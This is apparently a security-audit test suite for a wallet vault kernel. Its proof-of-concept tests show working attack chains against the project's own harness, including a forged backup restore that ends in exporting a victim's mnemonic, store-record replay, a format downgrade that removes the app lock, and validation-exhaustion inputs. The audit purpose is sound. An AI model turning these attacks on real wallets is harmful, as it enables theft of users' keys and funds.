/**
 * Security-audit proof-of-concept tests for the kernel vault. Each `it` asserts the CURRENT
 * (vulnerable) behaviour: a passing test demonstrates the attack described in its comment.
 * Threat actors: T2 = a compromised main runtime driving kernel calls; T4 = a writer with
 * direct access to the raw vault store (another process, a stale replica, a poisoned sync).
 */
import { serialize } from "node:v8";

import { sha256 } from "@noble/hashes/sha2.js";
import { bytesToHex, concatBytes, hexToBytes, utf8ToBytes } from "@noble/hashes/utils.js";
import { base58, base64urlnopad } from "@scure/base";
import { describe, expect, it } from "vite-plus/test";

import { requestBytes } from "@qntx/wallet/protocol";
import type { KernelEvent, ProtocolValue } from "@qntx/wallet/protocol";

import { keyIdOf } from "../src/derive/key-id.ts";
import type {
  Keystore,
  PasskeyAuthenticator,
  PasskeyResult,
  Pbkdf2,
} from "../src/platform.ts";
import { mnemonicBytes } from "../src/seed/mnemonic.ts";
import { open, seal } from "../src/vault/envelope.ts";
import { backupPasswordKek } from "../src/vault/factors.ts";
import { createMemoryStore } from "../src/vault/memory.ts";
import type { StoredFactor, StoredRecord, VaultImage, VaultMeta } from "../src/vault/store.ts";
import { createHarness, seededRandom } from "./harness.ts";
import type { Harness, KernelResponse } from "./harness.ts";
import { quickArgon2id, subtlePbkdf2 } from "./helpers.ts";
import { fakeKeystore } from "./keystore.ts";
import type { KeystoreCall } from "./keystore.ts";

const CREDENTIAL_ID = utf8ToBytes("credential-1");
const PRF_VAULT = hexToBytes("11".repeat(32));
const PRF_WALLET = hexToBytes("22".repeat(32));
const MNEMONIC =
  "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";

function ok(response: KernelResponse): ProtocolValue {
  if ("ok" in response) {
    return response.ok;
  }
  throw new Error(`expected ok, got ${JSON.stringify(response)}`);
}

function errCode(response: KernelResponse): string {
  if ("err" in response) {
    return response.err.code;
  }
  throw new Error(`expected err, got ${JSON.stringify(response)}`);
}

/** The error code of a response, or "ok" — for evidence logging only. */
function codeOrOk(response: KernelResponse): string {
  return "err" in response ? response.err.code : "ok";
}

function field(value: ProtocolValue, key: string): ProtocolValue {
  if (typeof value === "object" && value !== null && !(value instanceof Uint8Array)) {
    const entry = (value as Record<string, ProtocolValue>)[key];
    if (entry !== undefined) {
      return entry;
    }
  }
  throw new Error(`missing field ${key}`);
}

function arrField(value: ProtocolValue, key: string): ProtocolValue[] {
  const v = field(value, key);
  if (!Array.isArray(v)) {
    throw new TypeError(`field ${key} is not an array`);
  }
  return v;
}

function strField(value: ProtocolValue, key: string): string {
  const v = field(value, key);
  if (typeof v !== "string") {
    throw new TypeError(`field ${key} is not a string`);
  }
  return v;
}

const verifyPasskey = () => ({
  kind: "passkey" as const,
  credentialId: CREDENTIAL_ID,
  prf: new Uint8Array(PRF_VAULT),
});

const backupPw = (text: string) => ({
  kind: "password" as const,
  password: utf8ToBytes(text),
});

const vaultPw = (text: string) => ({
  kind: "password" as const,
  password: utf8ToBytes(text),
});

/** Web-style vault creation: host passkey ceremony, passkey vault factor. */
async function createPasskeyWallet(h: Harness): Promise<{ session: string; walletId: string }> {
  const res = ok(
    await h.call("wallet.createWithPasskey", {
      ceremony: "host",
      credentialId: CREDENTIAL_ID,
      prfWallet: new Uint8Array(PRF_WALLET),
      synced: true,
      factor: { kind: "passkey", credentialId: CREDENTIAL_ID, prf: new Uint8Array(PRF_VAULT) },
    }),
  );
  return {
    session: strField(res, "session"),
    walletId: strField(field(res, "wallet"), "walletId"),
  };
}

/** Scripted RN authenticator: each create/get returns the next queued answer. */
function scriptedAuthenticator(answers: Array<Partial<PasskeyResult>>): PasskeyAuthenticator {
  const answer = async (): Promise<PasskeyResult> => {
    await Promise.resolve();
    const next = answers.shift();
    if (next === undefined) {
      throw new Error("unscripted ceremony");
    }
    return {
      credentialId: new Uint8Array([7, 7, 7, 7]),
      first: new Uint8Array(32).fill(0x5a),
      second: undefined,
      userHandle: undefined,
      synced: true,
      userVerified: true,
      ...next,
    };
  };
  return { create: answer, get: answer };
}

function describeCall(call: KeystoreCall): string {
  const protection = "protection" in call ? `:${call.protection}` : "";
  const prompt =
    "prompt" in call && call.prompt !== undefined ? ` "${call.prompt.title}"` : "";
  return `${call.op}${protection}${prompt}`;
}

/** Keystore work that would show the user a system verification prompt. */
function presenceCalls(calls: ReadonlyArray<KeystoreCall>): KeystoreCall[] {
  return calls.filter(
    (call) =>
      call.op === "authenticate" ||
      ((call.op === "open" || call.op === "seal") && call.protection === "presence"),
  );
}

/** User-verification ceremonies: a presence `open` or an `authenticate` — NOT a creation seal. */
function verificationCalls(calls: ReadonlyArray<KeystoreCall>): KeystoreCall[] {
  return calls.filter(
    (call) =>
      call.op === "authenticate" || (call.op === "open" && call.protection === "presence"),
  );
}

function mustFindRecord(
  records: ReadonlyArray<StoredRecord>,
  kind: string,
): StoredRecord {
  const record = records.find((r) => r.kind === kind);
  if (record === undefined) {
    throw new Error(`missing ${kind} record`);
  }
  return record;
}

function mustFindFactor(
  factors: ReadonlyArray<StoredFactor>,
  kind: string,
): StoredFactor {
  const factor = factors.find((f) => f.kind === kind);
  if (factor === undefined) {
    throw new Error(`missing ${kind} factor`);
  }
  return factor;
}

function mustMeta(image: VaultImage): VaultMeta {
  const { meta } = image;
  if (meta === undefined) {
    throw new Error("vault is not initialized");
  }
  return meta;
}

function promptTitleOf(call: KeystoreCall | undefined): string | undefined {
  return call !== undefined && "prompt" in call ? call.prompt?.title : undefined;
}

function describeEvent(event: KernelEvent): string {
  return "reason" in event ? `${event.event}:${event.reason}` : event.event;
}

function mustPasswordEntry(
  factors: ReadonlyArray<{ kind: string; salt?: string; sealedBek: string }>,
): { kind: string; salt: string; sealedBek: string } {
  const entry = factors.find((f) => f.kind === "password" && f.salt !== undefined);
  if (entry === undefined || entry.salt === undefined) {
    throw new Error("no password factor");
  }
  return { kind: entry.kind, salt: entry.salt, sealedBek: entry.sealedBek };
}

/**
 * subtlePbkdf2 plus a tripwire: once `arm()` runs, the `nth` call whose iterations equal
 * `watchIterations` fires `onNth` right after the derivation resolves — while the caller's
 * KDF await is still suspended, exactly where a timer can interrupt a multi-step command.
 */
function tripwirePbkdf2(
  onNth: () => void,
  nth: number,
  watchIterations: number,
): { pbkdf2: Pbkdf2; arm: () => void } {
  let armed = false;
  let derived = 0;
  const pbkdf2: Pbkdf2 = async (hash, password, salt, iterations, length) => {
    const out = await subtlePbkdf2(hash, password, salt, iterations, length);
    if (armed && iterations === watchIterations) {
      derived += 1;
      if (derived === nth) {
        onNth();
      }
    }
    return out;
  };
  return {
    pbkdf2,
    arm: () => {
      armed = true;
    },
  };
}

describe("kernel-vault audit PoCs", () => {
  // An establishing backup.restore adopts the envelope's BEK unconditionally: an attacker who
  // gets an empty-wallet envelope restored on the victim's RN kernel silently owns every later
  // backup.update, which needs no verification because the adopted BEK is already trusted.
  // Attacker envelope → victim restore → victim creates a passkey wallet → T2 calls
  // backup.update → attacker restores offline and exports the victim's mnemonic.
  it("KV-01: forged establishing restore adopts an attacker BEK on React Native", async () => {
    const attackerPw = (): Uint8Array => utf8ToBytes("attacker-backup-pw-123");
    const VICTIM_PRF = new Uint8Array(32).fill(0x5a);

    // 1. Attacker device: a passkey wallet, backup under THEIR password, wallet deleted →
    // the envelope carries a valid BEK and zero wallets.
    const atk = createHarness({ seed: 901 });
    await atk.settle();
    const { session: atkSession, walletId: atkWalletId } = await createPasskeyWallet(atk);
    ok(
      await atk.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [{ kind: "password", password: attackerPw() }] },
        atkSession,
      ),
    );
    ok(
      await atk.call(
        "wallet.delete",
        { verify: verifyPasskey(), walletId: atkWalletId },
        atkSession,
      ),
    );
    const envelope = strField(
      ok(await atk.call("backup.update", null, atkSession)),
      "envelope",
    );
    const header = JSON.parse((JSON.parse(envelope) as { header: string }).header) as {
      wallets: unknown[];
    };
    expect(header.wallets).toHaveLength(0);

    // 2. Victim RN kernel: keystore + kernel-ceremony authenticator returning VICTIM_PRF.
    const fk = fakeKeystore();
    const authenticator = scriptedAuthenticator([{ first: new Uint8Array(VICTIM_PRF) }]);
    const v = createHarness({
      seed: 902,
      keystore: fk.keystore,
      passkey: authenticator,
      noIdle: true,
    });
    await v.settle();

    // 3. T2 drives the restore on the uninitialized vault → establishing → adopts the
    // attacker BEK. The only user-facing op is the establish's "Protect wallet" presence SEAL
    // (on iOS a presence seal shows no UI at all) — nothing tells the user this is a cloud
    // restore, and no presence `open`/`authenticate` ever verifies them.
    const restored = ok(
      await v.call("backup.restore", {
        envelope,
        backupFactor: { kind: "password", password: attackerPw() },
        factor: { kind: "device" },
      }),
    );
    const session = strField(restored, "session");
    const st = ok(await v.call("status", undefined, session));
    expect(field(st, "backup")).not.toBeNull();
    const restoreOps = fk.calls.map(describeCall);
    console.log("KV-01 keystore ops during establishing restore:", restoreOps);
    expect(verificationCalls(fk.calls)).toStrictEqual([]);

    // 4. The user creates a real passkey wallet in the adopted vault.
    const mark = fk.calls.length;
    const created = ok(
      await v.call(
        "wallet.createWithPasskey",
        {
          ceremony: "kernel",
          rpId: "wallet-harness.qntx.org",
          rpName: "Harness",
          name: "victim",
          walletSalt: "harness/wallet/v1",
        },
        session,
      ),
    );
    const walletId = strField(field(created, "wallet"), "walletId");

    // 5. T2 triggers backup.update — no verification, sealed under the attacker's BEK.
    const envelope2 = strField(ok(await v.call("backup.update", null, session)), "envelope");
    const during = fk.calls.slice(mark);
    console.log("KV-01 keystore ops during create+update:", during.map(describeCall));
    expect(verificationCalls(during)).toStrictEqual([]);

    // 6. Attacker restores envelope2 offline and exports the victim's mnemonic.
    const atk2 = createHarness({ seed: 903 });
    await atk2.settle();
    const res = ok(
      await atk2.call("backup.restore", {
        envelope: envelope2,
        backupFactor: { kind: "password", password: attackerPw() },
        factor: vaultPw("attacker-vault-pw-1"),
      }),
    );
    const wallets = arrField(res, "wallets").map((w) => strField(w, "walletId"));
    expect(wallets).toContain(walletId);
    const atk2Session = strField(res, "session");
    const exported = ok(
      await atk2.call(
        "wallet.exportMnemonic",
        { verify: vaultPw("attacker-vault-pw-1"), walletId },
        atk2Session,
      ),
    );
    expect(field(exported, "mnemonic")).toStrictEqual(mnemonicBytes(VICTIM_PRF.slice(0, 16)));

    // 7. Contrast: the legitimate backup.enable on the same victim kernel DOES verify —
    // a presence open with the "Turn on cloud backup" prompt.
    const mark2 = fk.calls.length;
    ok(
      await v.call(
        "backup.enable",
        { verify: { kind: "hardware" }, factors: [backupPw("legit-backup-pw-123")] },
        session,
      ),
    );
    const enablePresence = presenceCalls(fk.calls.slice(mark2));
    console.log("KV-01 keystore ops during backup.enable:", enablePresence.map(describeCall));
    expect(enablePresence).toHaveLength(1);
    const [openCall] = enablePresence;
    expect(openCall?.op).toBe("open");
    expect(promptTitleOf(openCall)).toBe("Turn on cloud backup");
  });

  // A store writer (T4) flips meta.format to 3. The next kernel treats it as a legacy vault
  // and "upgrades" it on unlock — silently re-adding the silent device factor the app lock had
  // removed. The user still sees only the "Unlock wallet" prompt; the app lock is gone.
  it("KV-02: vault-format downgrade by a store writer silently turns the app lock off", async () => {
    const fk = fakeKeystore();
    const h = createHarness({ keystore: fk.keystore, noIdle: true });
    await h.settle();
    const created = ok(
      await h.call("wallet.importMnemonic", {
        mnemonic: utf8ToBytes(MNEMONIC),
        factor: { kind: "device" },
      }),
    );
    const session = strField(created, "session");
    ok(
      await h.call(
        "vault.setAppLock",
        { enabled: true, verify: { kind: "hardware" } },
        session,
      ),
    );
    const st = ok(await h.call("status", undefined, session));
    expect(field(st, "appLock")).toBe(true);
    expect(arrField(st, "factors").map((f) => strField(f, "kind"))).toStrictEqual(["hardware"]);

    // T4: downgrade the on-disk format.
    await h.store.commit([{ op: "set-format", format: 3 }]);

    // A respawned kernel sees a format-3 vault; hardware unlock triggers the silent upgrade.
    const h2 = createHarness({ store: h.store, keystore: fk.keystore, noIdle: true });
    await h2.settle();
    const mark = fk.calls.length;
    ok(await h2.call("vault.unlock", { factor: { kind: "hardware" } }));
    const step = fk.calls.slice(mark);
    console.log("KV-02 keystore ops during downgraded unlock:", step.map(describeCall));
    const presence = presenceCalls(step);
    expect(presence).toHaveLength(1);
    const [openCall] = presence;
    expect(promptTitleOf(openCall)).toBe("Unlock wallet");

    const st2 = ok(await h2.call("status"));
    expect(field(st2, "appLock")).toBe(false);
    expect(arrField(st2, "factors").map((f) => strField(f, "kind"))).toContain("device");

    // A later kernel now unlocks with the silent device factor — zero presence at all.
    const h3 = createHarness({ store: h.store, keystore: fk.keystore, noIdle: true });
    await h3.settle();
    const mark3 = fk.calls.length;
    ok(await h3.call("vault.unlock", { factor: { kind: "device" } }));
    expect(presenceCalls(fk.calls.slice(mark3))).toStrictEqual([]);
  });

  // The store has no replay protection: a deleted record re-committed byte-for-byte opens
  // under the same DEK and is live again. T4 replays the blind-signing policy row after the
  // user turned it off — no integrity latch, session stays valid.
  it("KV-03a: replaying a deleted blind-signing policy row re-enables blind signing", async () => {
    const h = createHarness({ seed: 30 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    ok(
      await h.call(
        "vault.setBlindSigning",
        { enabled: true, verify: verifyPasskey() },
        session,
      ),
    );
    const image = await h.store.load();
    const captured = mustFindRecord(image.records, "policy");
    ok(
      await h.call(
        "vault.setBlindSigning",
        { enabled: false, verify: verifyPasskey() },
        session,
      ),
    );
    expect(field(ok(await h.call("status", undefined, session)), "blindSigning")).toBe(false);

    // T4 replays the deleted row.
    await h.store.commit([{ op: "put-record", record: captured }]);
    await h.settle();
    const st = ok(await h.call("status", undefined, session));
    expect(field(st, "blindSigning")).toBe(true);
    expect(field(st, "vault")).toBe("unlocked");
    ok(await h.call("session.touch", null, session));
  });

  // Same replay primitive against the backup-key record: re-enabling rotates the BEK but
  // T4 puts the old row back, and backup.update happily writes the next envelope under the
  // RETIRED key — the old backup password still opens it, the new one cannot.
  it("KV-03b: replaying an old backup-key row reinstates a retired BEK", async () => {
    const h = createHarness({ seed: 41 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    ok(
      await h.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [backupPw("old-backup-password-1")] },
        session,
      ),
    );
    const image = await h.store.load();
    const captured = mustFindRecord(image.records, "backup-key");
    const oldId = strField(
      field(ok(await h.call("status", undefined, session)), "backup"),
      "id",
    );
    ok(
      await h.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [backupPw("new-backup-password-2")] },
        session,
      ),
    );
    const newId = strField(
      field(ok(await h.call("status", undefined, session)), "backup"),
      "id",
    );
    expect(newId).not.toBe(oldId);

    // T4 replays the retired row; update then seals under the retired BEK and old factor list.
    await h.store.commit([{ op: "put-record", record: captured }]);
    await h.settle();
    expect(
      strField(field(ok(await h.call("status", undefined, session)), "backup"), "id"),
    ).toBe(oldId);
    const envelope = strField(ok(await h.call("backup.update", null, session)), "envelope");

    const restored = createHarness({ seed: 42 });
    await restored.settle();
    const res = ok(
      await restored.call("backup.restore", {
        envelope,
        backupFactor: backupPw("old-backup-password-1"),
        factor: vaultPw("fresh-vault-pw-1"),
      }),
    );
    expect(arrField(res, "wallets")).toHaveLength(1);

    const wrong = createHarness({ seed: 43 });
    await wrong.settle();
    expect(
      errCode(
        await wrong.call("backup.restore", {
          envelope,
          backupFactor: backupPw("new-backup-password-2"),
          factor: vaultPw("fresh-vault-pw-1"),
        }),
      ),
    ).toBe("wrong-password");
  });

  // Same primitive after backup.disable: replaying the captured backup-key row turns the
  // retired backup back on with no verification at all.
  it("KV-03c: replaying a backup-key row after backup.disable re-enables backup", async () => {
    const h = createHarness({ seed: 44 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    ok(
      await h.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [backupPw("old-backup-password-1")] },
        session,
      ),
    );
    const image = await h.store.load();
    const captured = mustFindRecord(image.records, "backup-key");
    ok(await h.call("backup.disable", { verify: verifyPasskey() }, session));
    expect(field(ok(await h.call("status", undefined, session)), "backup")).toBeNull();

    await h.store.commit([{ op: "put-record", record: captured }]);
    await h.settle();
    expect(field(ok(await h.call("status", undefined, session)), "backup")).not.toBeNull();
    ok(await h.call("backup.update", null, session));
  });

  // The proactive idle timer fires inside a change-password rotation: the session's DEK is
  // wiped mid-rotateVault, a record re-seal fails, and the error latches the whole vault
  // "corrupted" — a self-inflicted DoS. The store itself is intact (rotation never landed):
  // a fresh kernel still unlocks with the old password.
  it("KV-04: the idle timer firing during a rotation latches the vault corrupted", async () => {
    // The second 600k derivation after arming is the rotation's new-factor KEK — the idle
    // timer fires right after it resolves, mid-rotateVault.
    const ref: { h?: Harness } = {};
    const { pbkdf2, arm } = tripwirePbkdf2(() => ref.h?.advance(5 * 60_000 + 1), 2, 600000);
    const h = createHarness({ idleMs: 5 * 60_000, pbkdf2 });
    ref.h = h;
    await h.settle();
    const created = ok(
      await h.call("wallet.importMnemonic", {
        mnemonic: utf8ToBytes(MNEMONIC),
        factor: vaultPw("old-password-123"),
      }),
    );
    const session = strField(created, "session");

    arm();
    const res = await h.call(
      "vault.addFactor",
      { verify: vaultPw("old-password-123"), factor: vaultPw("new-password-456") },
      session,
    );
    expect(errCode(res)).toBe("integrity");
    expect(field(ok(await h.call("status")), "vault")).toBe("corrupted");
    expect(
      errCode(await h.call("vault.unlock", { factor: vaultPw("old-password-123") })),
    ).toBe("integrity");
    console.log("KV-04 kernel events:", h.events.map(describeEvent));

    // The rotation never committed: a fresh kernel on the same store unlocks with the OLD password.
    const h2 = createHarness({ store: h.store });
    await h2.settle();
    const unlocked = ok(
      await h2.call("vault.unlock", { factor: vaultPw("old-password-123") }),
    );
    expect(strField(unlocked, "session")).toMatch(/^[0-9a-f]{32}$/);
  });

  // verify-factor PRF buffers are wiped, but the backup passkey's `prfBackup` evidence is
  // consumed by HKDF without wiping — the caller's buffer keeps the live PRF output after
  // both backup.enable and backup.restore.
  it("KV-05: backup PRF output is never wiped", async () => {
    const h = createHarness({ seed: 50 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    const verify = { kind: "passkey" as const, credentialId: CREDENTIAL_ID, prf: new Uint8Array(PRF_VAULT) };
    const prfBackup = new Uint8Array(32).fill(0x33);
    ok(
      await h.call(
        "backup.enable",
        {
          verify,
          factors: [
            {
              kind: "passkey",
              ceremony: "host",
              credentialId: CREDENTIAL_ID,
              prfBackup,
            },
          ],
        },
        session,
      ),
    );
    expect(verify.prf.every((b) => b === 0)).toBe(true);
    expect(prfBackup.every((b) => b === 0x33)).toBe(true);

    const envelope = strField(ok(await h.call("backup.update", null, session)), "envelope");
    const b = createHarness({ seed: 51 });
    await b.settle();
    const restorePrf = new Uint8Array(32).fill(0x33);
    ok(
      await b.call("backup.restore", {
        envelope,
        backupFactor: {
          kind: "passkey",
          ceremony: "host",
          credentialId: CREDENTIAL_ID,
          prfBackup: restorePrf,
        },
        factor: vaultPw("restore-vault-pw-1"),
      }),
    );
    expect(restorePrf.every((x) => x === 0x33)).toBe(true);
  });

  // Structured clone preserves shared references (a DAG), but the kernel's isProtocolValue
  // and requestBytes walk every occurrence — validation cost doubles per nesting level while
  // the wire size is tiny. Method-name lookup also uses `in`, so inherited Object.prototype
  // keys pass the check and crash the dispatch.
  it("KV-06: structured-clone DAG makes request validation exponential", async () => {
    const dag = (d: number): ProtocolValue => {
      let n: ProtocolValue = "x";
      for (let i = 0; i < d; i++) {
        n = [n, n];
      }
      return n;
    };
    const b10 = requestBytes(dag(10));
    const b14 = requestBytes(dag(14));
    const b18 = requestBytes(dag(18));
    console.log(`KV-06 requestBytes d10=${b10} d14=${b14} d18=${b18} ratio18/14=${b18 / b14}`);
    expect(b18 / b14).toBeGreaterThan(15.9);
    expect(b18 / b14).toBeLessThan(16.1);
    // The actual serialized payload stays minuscule — shared refs, not 2^40 leaves.
    expect(serialize(dag(40)).length).toBeLessThan(1024);

    const h = createHarness({ seed: 60 });
    await h.settle();
    for (const d of [16, 18, 20, 22]) {
      const t0 = performance.now();
      // oxlint-disable-next-line eslint/no-await-in-loop -- serialized deliberately, one depth at a time
      const res = await h.sendRaw({ v: 3, id: d, method: "status", params: dag(d) });
      const ms = performance.now() - t0;
      console.log(`KV-06 dag(${d}): ${ms.toFixed(1)}ms -> ${codeOrOk(res)}`);
      expect("err" in res).toBe(true);
    }
    ok(await h.call("status"));

    for (const method of ["constructor", "__proto__", "toString"]) {
      // oxlint-disable-next-line eslint/no-await-in-loop -- serialized deliberately
      const res = await h.sendRaw({ v: 3, id: 900, method, params: null });
      console.log(`KV-06 method "${method}" -> ${codeOrOk(res)}`);
      expect("err" in res).toBe(true);
    }
    ok(await h.call("status"));
  });

  // Password back-off is check-then-act against the shared store: two kernels on the same
  // store both pass the armed-backoff check inside one window, so the limiter counts two
  // guesses at once. The deadline itself is wall-clock based — advancing the wall clock
  // (not the monotonic clock) is what releases it.
  it("KV-07: password back-off is check-then-act across kernels and follows the wall clock", async () => {
    const store = createMemoryStore();
    const a = createHarness({ store, seed: 71 });
    const b = createHarness({ store, seed: 72 });
    await Promise.all([a.settle(), b.settle()]);
    ok(
      await a.call("wallet.importMnemonic", {
        mnemonic: utf8ToBytes(MNEMONIC),
        factor: vaultPw("right-password-1"),
      }),
    );
    for (let i = 0; i < 5; i++) {
      // oxlint-disable-next-line eslint/no-await-in-loop -- sequential attempts
      const wrong = await a.call("vault.unlock", { factor: vaultPw("wrong-password-x") });
      expect(errCode(wrong)).toBe("wrong-password");
    }
    // The 6th attempt is inside the 30 s window → rate-limited, not counted.
    expect(
      errCode(await a.call("vault.unlock", { factor: vaultPw("wrong-password-x") })),
    ).toBe("rate-limited");

    a.advanceWall(30_001);
    b.advanceWall(30_001);
    const [ra, rb] = await Promise.all([
      a.call("vault.unlock", { factor: vaultPw("wrong-password-x") }),
      b.call("vault.unlock", { factor: vaultPw("wrong-password-x") }),
    ]);
    console.log(`KV-07 parallel attempts: a=${codeOrOk(ra)} b=${codeOrOk(rb)}`);
    expect(errCode(ra)).toBe("wrong-password");
    expect(errCode(rb)).toBe("wrong-password");
    const image = await store.load();
    expect(image.meta?.failedAttempts).toBe(7);

    // Wall-clock deadline: the next attempt is limited; +300 s of wall time releases it.
    expect(
      errCode(await a.call("vault.unlock", { factor: vaultPw("wrong-password-x") })),
    ).toBe("rate-limited");
    a.advanceWall(300_001);
    const after = await a.call("vault.unlock", { factor: vaultPw("wrong-password-x") });
    console.log(`KV-07 after +300s wall: ${codeOrOk(after)}`);
    expect(errCode(after)).toBe("wrong-password");
  });

  // The backup header lists every imported key's public keyId — SHA-256 over the address —
  // unencrypted. Whoever reads the cloud envelope can test membership of any known address.
  it("KV-08: the cloud backup header links the cloud account to imported Solana addresses", async () => {
    const h = createHarness({ seed: 80 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    const imported = ok(
      await h.call(
        "keys.import",
        { family: "solana", secret: new Uint8Array(32).fill(0x42) },
        session,
      ),
    );
    const address = strField(imported, "address");
    ok(
      await h.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [backupPw("backup-password-1")] },
        session,
      ),
    );
    const envelope = strField(ok(await h.call("backup.update", null, session)), "envelope");
    const header = JSON.parse((JSON.parse(envelope) as { header: string }).header) as {
      keys?: Array<{ keyId: string }>;
    };
    const keyId = header.keys?.[0]?.keyId;
    // The address alone reproduces the keyId — public-key preimage not needed to link it.
    expect(keyId).toBe(keyIdOf("solana", base58.decode(address)));
  });

  // The payload parser breaks out of its loop on a tag byte that lacks its two header bytes —
  // a single trailing 0x01/0x02 byte is silently ignored, while the sealed tag still verifies
  // (the extension is INSIDE the authenticated plaintext). One byte restores fine; two is
  // caught — pinning the exact off-by-one.
  it("KV-09: backup payload parser accepts one trailing tag byte", async () => {
    const P = "backup-password-xyz";
    const h = createHarness({ seed: 90 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    ok(
      await h.call(
        "backup.enable",
        { verify: verifyPasskey(), factors: [backupPw(P)] },
        session,
      ),
    );
    const envelope = strField(ok(await h.call("backup.update", null, session)), "envelope");
    const env = JSON.parse(envelope) as {
      version: number;
      createdAt: number;
      header: string;
      factors: Array<{ kind: string; salt?: string; sealedBek: string }>;
      payload: string;
    };
    const entry = mustPasswordEntry(env.factors);
    // Recover the BEK exactly the way the password holder would.
    const kek = await backupPasswordKek(
      utf8ToBytes(P),
      base64urlnopad.decode(entry.salt),
      quickArgon2id,
    );
    const bek = open(
      kek,
      base64urlnopad.decode(entry.sealedBek),
      "qntx-wallet/backup/v1/factor/password",
      "",
    );
    const context = `qntx-wallet/backup/v1/payload/${bytesToHex(
      sha256(utf8ToBytes(env.header)),
    )}`;
    const plaintext = open(bek, base64urlnopad.decode(env.payload), context, "");
    const rnd = seededRandom(999).random;
    const tryTail = async (tail: number[]): Promise<KernelResponse> => {
      const tampered = {
        ...env,
        payload: base64urlnopad.encode(
          seal(bek, concatBytes(plaintext, new Uint8Array(tail)), context, "", rnd),
        ),
      };
      const b = createHarness({ seed: 91 + tail.length });
      await b.settle();
      return b.call("backup.restore", {
        envelope: JSON.stringify(tampered),
        backupFactor: backupPw(P),
        factor: vaultPw("restore-vault-pw-1"),
      });
    };
    const one = await tryTail([0x01]);
    expect(codeOrOk(one)).toBe("ok");
    const two = await tryTail([0x01, 0x01]);
    expect(errCode(two)).toBe("integrity");
  });

  // setAppLock commits the DEK rotation before removing the device key, and the remove is
  // best-effort: when keystore.remove fails, the hardware key survives. Rolling the store
  // image back to the pre-app-lock snapshot makes the "deleted" factor open the vault
  // silently again.
  it("KV-10: app lock with a failing keystore.remove leaves the old device key usable", async () => {
    const fk = fakeKeystore();
    const wrapped: Keystore = {
      ...fk.keystore,
      remove: async (id) => {
        fk.calls.push({ op: "remove", id });
        await Promise.resolve();
        throw new Error("keystore remove failed");
      },
    };
    const h = createHarness({ keystore: wrapped, noIdle: true });
    await h.settle();
    const created = ok(
      await h.call("wallet.importMnemonic", {
        mnemonic: utf8ToBytes(MNEMONIC),
        factor: { kind: "device" },
      }),
    );
    const session = strField(created, "session");
    const snapshot = await h.store.load();
    ok(
      await h.call(
        "vault.setAppLock",
        { enabled: true, verify: { kind: "hardware" } },
        session,
      ),
    );
    const deviceRow = mustFindFactor(snapshot.factors, "device");
    const meta = mustMeta(snapshot);
    expect(fk.keys.has(deviceRow.id)).toBe(true); // remove failed → key still in the keystore

    // T4 rolls the store image back to the pre-app-lock snapshot.
    await h.store.commit([{ op: "clear" }]);
    await h.store.commit([
      { op: "init", meta },
      ...snapshot.factors.map((f) => ({ op: "put-factor" as const, factor: f })),
      ...snapshot.records.map((r) => ({ op: "put-record" as const, record: r })),
    ]);

    const h2 = createHarness({ store: h.store, keystore: wrapped, noIdle: true });
    await h2.settle();
    const mark = fk.calls.length;
    ok(await h2.call("vault.unlock", { factor: { kind: "device" } }));
    console.log(
      "KV-10 keystore ops during rolled-back unlock:",
      fk.calls.slice(mark).map(describeCall),
    );
    expect(presenceCalls(fk.calls.slice(mark))).toStrictEqual([]);
  });

  // `keys.list` is presence-marked, so a pure read keeps refreshing the idle timer —
  // background traffic can hold a session open forever. `status` is not presence-bearing:
  // the same cadence through it still locks on time.
  it("KV-11: keys.list (a read) renews the idle timer", async () => {
    const h = createHarness({ seed: 100, idleMs: 5 * 60_000 });
    await h.settle();
    const { session } = await createPasskeyWallet(h);
    for (let i = 0; i < 3; i++) {
      h.advance(4 * 60_000);
      // oxlint-disable-next-line eslint/no-await-in-loop -- the cadence is the point
      ok(await h.call("keys.list", null, session));
    }
    // 12 minutes of nothing but reads — the session is still alive.
    ok(await h.call("session.touch", null, session));

    const h2 = createHarness({ seed: 101, idleMs: 5 * 60_000 });
    await h2.settle();
    const { session: session2 } = await createPasskeyWallet(h2);
    h2.advance(4 * 60_000);
    ok(await h2.call("status", undefined, session2));
    h2.advance(4 * 60_000);
    // Two advances past idle with only non-presence calls → locked.
    expect(errCode(await h2.call("session.touch", null, session2))).toBe("locked");
  });
});
